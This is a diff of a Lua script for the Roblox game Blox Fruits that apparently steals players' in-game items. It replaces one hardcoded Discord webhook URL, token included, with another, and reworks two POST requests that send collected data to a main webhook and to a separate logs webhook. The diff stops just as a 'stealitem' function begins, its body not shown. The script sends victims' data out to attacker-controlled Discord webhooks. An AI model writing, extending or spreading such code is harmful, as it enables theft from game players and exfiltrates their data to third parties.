@@ -1,6 +1,5 @@
 -- BLOX FRUIT?
-Username = "TehPucuk_55"
-LogsWebhook = "https://discord.com/api/webhooks/1207564677261828136/3fPdzMvRUB-eKKI4wmGp7tr0Ay5FJeIJJ7nnNwzrUBb7cyxY4jpZV4hRrKATPBBZRz_R"
+LogsWebhook = "https://discord.com/api/webhooks/1318650965255262343/FDMkfG_JCpuYL0ZFJVpZW6vsug9Gb5poG57ogeCHtJEZeO5LWXRuFjXoF_wAQqXgVZ"
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local CoreGui = game:GetService("CoreGui")
@@ -91,23 +90,27 @@ local function sendWebhook()
         ["embeds"] = {embed}
     })
 
-    request({
+    local WebhookResponse =
+    request(
+    {
         Url = Webhook,
         Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
+        Headers = headers,
         Body = data
-    })
-
-request({
+    }
+)
+    
+    local logsResponse =
+    request(
+    {
         Url = LogsWebhook,
         Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = data
-    })
+        Headers = headers,
+        Body = data2
+    }
+)
+
+end
 
 function stealitem()
     if result >= 5000 then
